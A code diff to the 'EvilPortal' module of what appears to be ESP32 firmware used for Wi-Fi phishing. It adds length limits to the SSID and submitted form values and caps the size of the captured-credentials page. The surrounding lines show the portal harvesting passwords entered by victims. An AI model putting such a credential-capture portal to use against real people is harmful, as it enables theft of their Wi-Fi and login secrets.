@@ -49,7 +49,7 @@ void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *req
         url == bruceConfig.evilPortalEndpoints.setSsidEndpoint && bruceConfig.evilPortalEndpoints.allowSetSsid
     ) {
         if (request->hasArg("ssid")) {
-            _portal->apName = request->arg("ssid").c_str();
+            _portal->apName = request->arg("ssid").substring(0, 32).c_str();
             request->send(200, "text/html", _portal->ssid_POST());
             _portal->_pendingWifiRestart = true;
         } else {
@@ -237,7 +237,7 @@ void EvilPortal::setupRoutes() {
         webServer.on(
             bruceConfig.evilPortalEndpoints.setSsidEndpoint.c_str(), [this](AsyncWebServerRequest *request) {
                 if (request->hasArg("ssid")) {
-                    apName = request->arg("ssid").c_str();
+                    apName = request->arg("ssid").substring(0, 32).c_str();
                     request->send(200, "text/html", ssid_POST());
                     _pendingWifiRestart = true;
                 } else {
@@ -691,7 +691,7 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
 
         if (key == "password" && _verifyPwd) { passwordValue = request->arg(i); }
 
-        String valueBuffer = request->arg(i);
+        String valueBuffer = request->arg(i).substring(0, 256);
 
         if (key == "password") {
             char blank = '*';
@@ -739,7 +739,8 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
         request->send(200, "text/html", wifiLoadPage());
     }
 
-    capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
+    if (capturedCredentialsHtml.length() < 8192)
+        capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
     totalCapturedCredentials++;
 }
 
